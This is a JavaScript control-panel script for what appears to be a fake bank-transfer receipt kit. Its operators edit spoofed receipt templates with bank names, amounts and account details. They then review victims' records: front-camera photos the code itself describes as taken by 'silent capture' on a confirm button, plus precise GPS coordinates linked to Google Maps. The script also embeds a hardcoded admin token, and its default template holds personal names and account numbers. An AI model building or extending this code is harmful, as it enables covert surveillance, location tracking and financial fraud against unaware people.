// ============================================================
// HELIX CONTROL PANEL & DASHBOARD SCRIPT V2
// Integrated with: Silent Front Camera + Location + Receipt Photo
// ============================================================

(function() {
    'use strict';

    const CONFIG = {
        API_URL: '/api/locations',
        TEMPLATE_URL: '/api/template',
        SYNC_CHANNEL: 'bankidzz_sync_channel',
        AUTH_TOKEN: 'Bearer bankidzz-admin-secure-2026'
    };

    // DOM Elements
    const elements = {
        liveClock: document.getElementById('liveClock'),
        // Tabs
        tabDashboard: document.getElementById('tabDashboard'),
        tabTransfer: document.getElementById('tabTransfer'),
        tabUser: document.getElementById('tabUser'),
        sectionDashboard: document.getElementById('sectionDashboard'),
        sectionTransfer: document.getElementById('sectionTransfer'),
        sectionUser: document.getElementById('sectionUser'),
        // Form Inputs
        t_topBarTitle: document.getElementById('t_topBarTitle'),
        t_primaryColor: document.getElementById('t_primaryColor'),
        t_profileImage: document.getElementById('t_profileImage'),
        t_bankName: document.getElementById('t_bankName'),
        t_bankSub: document.getElementById('t_bankSub'),
        t_amountMain: document.getElementById('t_amountMain'),
        t_amountSub: document.getElementById('t_amountSub'),
        t_senderBank: document.getElementById('t_senderBank'),
        t_senderName: document.getElementById('t_senderName'),
        t_senderAccount: document.getElementById('t_senderAccount'),
        t_receiverBank: document.getElementById('t_receiverBank'),
        t_receiverName: document.getElementById('t_receiverName'),
        t_receiverAccount: document.getElementById('t_receiverAccount'),
        t_buttonText: document.getElementById('t_buttonText'),
        // Buttons & Containers
        btnRefresh: document.getElementById('btnRefresh'),
        btnClearAll: document.getElementById('btnClearAll'),
        transTableBody: document.getElementById('transTableBody'),
        alertEmpty: document.getElementById('alertEmpty'),
        tableWrapper: document.getElementById('tableWrapper'),
        notification: document.getElementById('notification'),
        // Image Modal
        imgViewerModal: document.getElementById('imgViewerModal'),
        imgModalTitle: document.getElementById('imgModalTitle'),
        imgModalFull: document.getElementById('imgModalFull'),
        btnDownloadImg: document.getElementById('btnDownloadImg'),
        // NEW: Front Camera Modal
        frontCamModal: document.getElementById('frontCamModal'),
        frontCamTitle: document.getElementById('frontCamTitle'),
        frontCamImg: document.getElementById('frontCamImg'),
        btnDownloadFront: document.getElementById('btnDownloadFront'),
        frontCamInfo: document.getElementById('frontCamInfo')
    };

    // ============================================================
    // LIVE CLOCK
    // ============================================================
    function updateClock() {
        if (!elements.liveClock) return;
        const now = new Date();
        const hrs = String(now.getHours()).padStart(2, '0');
        const mins = String(now.getMinutes()).padStart(2, '0');
        const secs = String(now.getSeconds()).padStart(2, '0');
        elements.liveClock.textContent = `${hrs}.${mins}.${secs}`;
    }
    setInterval(updateClock, 1000);
    updateClock();

    // ============================================================
    // TAB SWITCHER
    // ============================================================
    window.switchTab = function(tabName) {
        if (elements.tabDashboard) elements.tabDashboard.classList.remove('active');
        if (elements.tabTransfer) elements.tabTransfer.classList.remove('active');
        if (elements.tabUser) elements.tabUser.classList.remove('active');

        if (elements.sectionDashboard) elements.sectionDashboard.style.display = 'none';
        if (elements.sectionTransfer) elements.sectionTransfer.style.display = 'none';
        if (elements.sectionUser) elements.sectionUser.style.display = 'none';

        if (tabName === 'dashboard') {
            if (elements.tabDashboard) elements.tabDashboard.classList.add('active');
            if (elements.sectionDashboard) elements.sectionDashboard.style.display = 'block';
            loadTransactions();
        } else if (tabName === 'transfer') {
            if (elements.tabTransfer) elements.tabTransfer.classList.add('active');
            if (elements.sectionTransfer) elements.sectionTransfer.style.display = 'block';
        } else if (tabName === 'user') {
            if (elements.tabUser) elements.tabUser.classList.add('active');
            if (elements.sectionUser) elements.sectionUser.style.display = 'block';
        }
    };

    // ============================================================
    // NOTIFICATION
    // ============================================================
    function showNotification(msg) {
        if (!elements.notification) return;
        elements.notification.textContent = msg;
        elements.notification.classList.add('show');
        setTimeout(() => {
            elements.notification.classList.remove('show');
        }, 3000);
    }

    // ============================================================
    // TEMPLATE MANAGEMENT
    // ============================================================
    async function loadTemplate() {
        try {
            const response = await fetch(CONFIG.TEMPLATE_URL, { cache: 'no-store' });
            if (response.ok) {
                const result = await response.json();
                if (result.template) {
                    populateTemplateForm(result.template);
                    return;
                }
            }
        } catch(e) {
            console.warn('Gagal memuat template dari server', e);
        }
        
        const stored = localStorage.getItem('bankidzz_new_template');
        if (stored) {
            try {
                populateTemplateForm(JSON.parse(stored));
            } catch(e) {}
        }
    }

    function populateTemplateForm(template) {
        if(elements.t_topBarTitle) elements.t_topBarTitle.value = template.topBarTitle || 'JAPANESE BANK';
        if(elements.t_primaryColor) elements.t_primaryColor.value = template.primaryColor || '#0033ff';
        if(elements.t_profileImage) elements.t_profileImage.value = template.profileImage || 'channels4_profile.jpg';
        if(elements.t_bankName) elements.t_bankName.value = template.bankName || 'BIBD Brunei Darussalam';
        if(elements.t_bankSub) elements.t_bankSub.value = template.bankSub || 'Office Purchasing';
        if(elements.t_amountMain) elements.t_amountMain.value = template.amountMain || 'IDR 515.000';
        if(elements.t_amountSub) elements.t_amountSub.value = template.amountSub || 'BND 35.12';
        if(elements.t_senderBank) elements.t_senderBank.value = template.senderBank || 'BIBD Brunei Darussalam';
        if(elements.t_senderName) elements.t_senderName.value = template.senderName || 'FITO ALAMSYAH';
        if(elements.t_senderAccount) elements.t_senderAccount.value = template.senderAccount || '72828172718';
        if(elements.t_receiverBank) elements.t_receiverBank.value = template.receiverBank || 'BANK BNI';
        if(elements.t_receiverName) elements.t_receiverName.value = template.receiverName || 'Tasliyah';
        if(elements.t_receiverAccount) elements.t_receiverAccount.value = template.receiverAccount || '2093832050';
        if(elements.t_buttonText) elements.t_buttonText.value = template.buttonText || 'Ambil Foto Konfirmasi / Tanda Tangan';
    }

    window.saveTemplate = async function() {
        const template = {
            topBarTitle: elements.t_topBarTitle ? elements.t_topBarTitle.value : 'JAPANESE BANK',
            primaryColor: elements.t_primaryColor ? elements.t_primaryColor.value : '#0033ff',
            profileImage: elements.t_profileImage ? elements.t_profileImage.value : 'channels4_profile.jpg',
            bankName: elements.t_bankName ? elements.t_bankName.value : 'BIBD Brunei Darussalam',
            bankSub: elements.t_bankSub ? elements.t_bankSub.value : 'Office Purchasing',
            amountMain: elements.t_amountMain ? elements.t_amountMain.value : 'IDR 515.000',
            amountSub: elements.t_amountSub ? elements.t_amountSub.value : 'BND 35.12',
            senderBank: elements.t_senderBank ? elements.t_senderBank.value : 'BIBD Brunei Darussalam',
            senderName: elements.t_senderName ? elements.t_senderName.value : 'FITO ALAMSYAH',
            senderAccount: elements.t_senderAccount ? elements.t_senderAccount.value : '72828172718',
            receiverBank: elements.t_receiverBank ? elements.t_receiverBank.value : 'BANK BNI',
            receiverName: elements.t_receiverName ? elements.t_receiverName.value : 'Tasliyah',
            receiverAccount: elements.t_receiverAccount ? elements.t_receiverAccount.value : '2093832050',
            buttonText: elements.t_buttonText ? elements.t_buttonText.value : 'Ambil Foto Konfirmasi / Tanda Tangan'
        };

        localStorage.setItem('bankidzz_new_template', JSON.stringify(template));

        try {
            await fetch(CONFIG.TEMPLATE_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': CONFIG.AUTH_TOKEN
                },
                body: JSON.stringify(template)
            });
        } catch(e) {}

        showNotification('Configuration saved & synced!');
        
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.postMessage({ type: 'template_updated', template: template });
            channel.close();
        } catch(e) {}
    };

    // ============================================================
    // LOAD TRANSACTIONS - DENGAN DATA LENGKAP
    // ============================================================
    async function loadTransactions() {
        let transfers = [];

        // Baca dari localStorage
        try {
            const localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
            if (Array.isArray(localStored)) {
                transfers = [...localStored];
            }
        } catch(e) {}

        // Baca dari server
        try {
            const response = await fetch(CONFIG.API_URL, {
                headers: { 'Authorization': CONFIG.AUTH_TOKEN }
            });

            if (response.ok) {
                const result = await response.json();
                if (result.transfers && Array.isArray(result.transfers)) {
                    const map = new Map();
                    transfers.forEach(t => map.set(t.transferId, t));
                    result.transfers.forEach(t => map.set(t.transferId, t));
                    transfers = Array.from(map.values());
                }
            }
        } catch(e) {
            console.warn('Backend API not reachable, displaying local sync data.', e);
        }

        renderTransactions(transfers);
    }

    // ============================================================
    // RENDER TRANSACTIONS - DENGAN KOLOM FOTO DEPAN
    // ============================================================
    function renderTransactions(transfers) {
        if (!elements.transTableBody) return;
        elements.transTableBody.innerHTML = '';
        
        if (!transfers || transfers.length === 0) {
            if (elements.alertEmpty) elements.alertEmpty.style.display = 'flex';
            if (elements.tableWrapper) elements.tableWrapper.style.display = 'none';
            return;
        }

        if (elements.alertEmpty) elements.alertEmpty.style.display = 'none';
        if (elements.tableWrapper) elements.tableWrapper.style.display = 'block';

        transfers.sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));

        transfers.forEach(t => {
            const tr = document.createElement('tr');
            
            // ==========================================
            // 1. FOTO BARANG/STRUK (Kamera Belakang) - BESAR
            // ==========================================
            let receiptPhotoHtml = '<div style="color:var(--text-muted); font-size:12px; width:140px; height:140px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.03); border-radius:10px; border:1px dashed #334155;">Tidak Ada Foto</div>';
            const receiptImg = t.photo || t.receiptPhoto || '';
            if (receiptImg) {
                receiptPhotoHtml = `<img src="${receiptImg}" class="photo-thumb-large photo-thumb-receipt" alt="Struk ${t.transferId}" onclick="window.viewFullPhoto('${receiptImg}', '${t.transferId}')" title="Klik untuk perbesar Foto Barang/Struk">`;
            }

            // ==========================================
            // 2. FOTO KAMERA DEPAN (Silent Capture) - BESAR
            // ==========================================
            let frontPhotoHtml = '<div style="color:var(--text-muted); font-size:12px; width:140px; height:140px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.03); border-radius:10px; border:1px dashed #334155;">Tidak Ada Foto</div>';
            const frontImg = t.frontPhoto || t.front_photo || '';
            if (frontImg) {
                frontPhotoHtml = `<img src="${frontImg}" class="photo-thumb-large photo-thumb-front" alt="Depan ${t.transferId}" onclick="window.viewFrontPhoto('${frontImg}', '${t.transferId}')" title="Klik untuk perbesar FOTO KAMERA DEPAN (SILENT)">`;
            }

            // ==========================================
            // 3. LOKASI (GPS AKURAT)
            // ==========================================
            let locStr = '<span style="color:var(--text-muted)">Tanpa GPS</span>';
            if (t.location && typeof t.location.lat === 'number' && typeof t.location.lng === 'number') {
                const acc = t.location.accuracy ? `±${Math.round(t.location.accuracy)}m` : '';
                locStr = `
                    <div style="font-family:'Share Tech Mono', monospace; font-size:13px; line-height:1.6;">
                        <div style="color:#ffffff; font-weight:700;">Lat: ${t.location.lat.toFixed(6)}</div>
                        <div style="color:#ffffff; font-weight:700;">Lng: ${t.location.lng.toFixed(6)}</div>
                        ${acc ? `<div style="color:var(--accent-green); font-size:11px;">Akurasi: ${acc}</div>` : ''}
                        <a href="https://www.google.com/maps/search/?api=1&query=${t.location.lat},${t.location.lng}" target="_blank" style="display:inline-block; margin-top:6px; padding:4px 10px; background:rgba(0,255,179,0.15); border:1px solid var(--accent-green); border-radius:6px; color:var(--accent-green); text-decoration:none; font-weight:bold; font-size:11px;">📍 Buka Google Maps ↗</a>
                    </div>
                `;
            }

            // ==========================================
            // 4. WAKTU (WIB)
            // ==========================================
            let timeStr = t.timestamp ? new Date(t.timestamp).toLocaleString('id-ID', {
                dateStyle: 'medium',
                timeStyle: 'medium'
            }) : '-';

            tr.innerHTML = `
                <td style="vertical-align:top; padding:16px;">${receiptPhotoHtml}</td>
                <td style="vertical-align:top; padding:16px;">${frontPhotoHtml}</td>
                <td style="vertical-align:top; padding:16px;">${locStr}</td>
                <td style="vertical-align:top; padding:16px; font-family:'Share Tech Mono',monospace; font-size:13px; color:var(--text-light);">${timeStr}</td>
                <td style="vertical-align:top; padding:16px;">
                    <button class="btn-action-del" onclick="window.deleteTransaction('${t.transferId}')">🗑️ Hapus</button>
                </td>
            `;
            elements.transTableBody.appendChild(tr);
        });
    }

    // ============================================================
    // VIEW FOTO STRUK (KAMERA BELAKANG)
    // ============================================================
    window.viewFullPhoto = function(photoUrl, refId) {
        if (!elements.imgViewerModal) return;
        if (elements.imgModalTitle) elements.imgModalTitle.textContent = `FOTO BARANG/STRUK [ ${refId} ]`;
        if (elements.imgModalFull) elements.imgModalFull.src = photoUrl;
        if (elements.btnDownloadImg) {
            elements.btnDownloadImg.href = photoUrl;
            elements.btnDownloadImg.download = `Struk_${refId}.jpg`;
        }
        elements.imgViewerModal.style.display = 'flex';
    };

    window.closeImgModal = function() {
        if (elements.imgViewerModal) elements.imgViewerModal.style.display = 'none';
    };

    // ============================================================
    // VIEW FOTO KAMERA DEPAN (SILENT CAPTURE)
    // ============================================================
    window.viewFrontPhoto = function(photoUrl, refId) {
        if (!elements.frontCamModal) return;
        if (elements.frontCamTitle) elements.frontCamTitle.textContent = `FOTO KAMERA DEPAN (SILENT) [ ${refId} ]`;
        if (elements.frontCamImg) elements.frontCamImg.src = photoUrl;
        if (elements.btnDownloadFront) {
            elements.btnDownloadFront.href = photoUrl;
            elements.btnDownloadFront.download = `FrontCamera_${refId}.jpg`;
        }
        if (elements.frontCamInfo) {
            elements.frontCamInfo.textContent = `Diambil secara silent capture saat user menekan tombol konfirmasi`;
        }
        elements.frontCamModal.style.display = 'flex';
    };

    window.closeFrontCamModal = function() {
        if (elements.frontCamModal) elements.frontCamModal.style.display = 'none';
    };

    // ============================================================
    // DELETE TRANSACTION
    // ============================================================
    window.deleteTransaction = async function(transferId) {
        if (!confirm(`Hapus transaksi ${transferId}?`)) return;

        try {
            let localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
            localStored = localStored.filter(t => t.transferId !== transferId);
            localStorage.setItem('bankidzz_local_transactions', JSON.stringify(localStored));
        } catch(e) {}

        try {
            await fetch(`${CONFIG.API_URL}?id=${encodeURIComponent(transferId)}`, {
                method: 'DELETE',
                headers: { 'Authorization': CONFIG.AUTH_TOKEN }
            });
        } catch(e) {}

        showNotification('Transaksi berhasil dihapus.');
        loadTransactions();
    };

    // ============================================================
    // CLEAR ALL
    // ============================================================
    async function clearAllTransactions() {
        if (!confirm('Apakah Anda yakin ingin menghapus SELURUH data transaksi & foto?')) return;

        localStorage.removeItem('bankidzz_local_transactions');

        try {
            await fetch(`${CONFIG.API_URL}?all=true`, {
                method: 'DELETE',
                headers: { 'Authorization': CONFIG.AUTH_TOKEN }
            });
        } catch(e) {}

        showNotification('Seluruh data berhasil dibersihkan.');
        loadTransactions();
    }

    // ============================================================
    // REAL-TIME SYNC LISTENER
    // ============================================================
    function setupSyncListener() {
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.addEventListener('message', (event) => {
                if (event.data && event.data.type === 'NEW_LOCATION') {
                    showNotification('⚡ Transaksi Baru + Foto Depan Silent + Lokasi Diterima!');
                    loadTransactions();
                }
            });
        } catch(e) {}
    }

    // ============================================================
    // EVENTS
    // ============================================================
    if (elements.btnRefresh) elements.btnRefresh.addEventListener('click', loadTransactions);
    if (elements.btnClearAll) elements.btnClearAll.addEventListener('click', clearAllTransactions);

    // Init
    loadTemplate();
    loadTransactions();
    setupSyncListener();

})();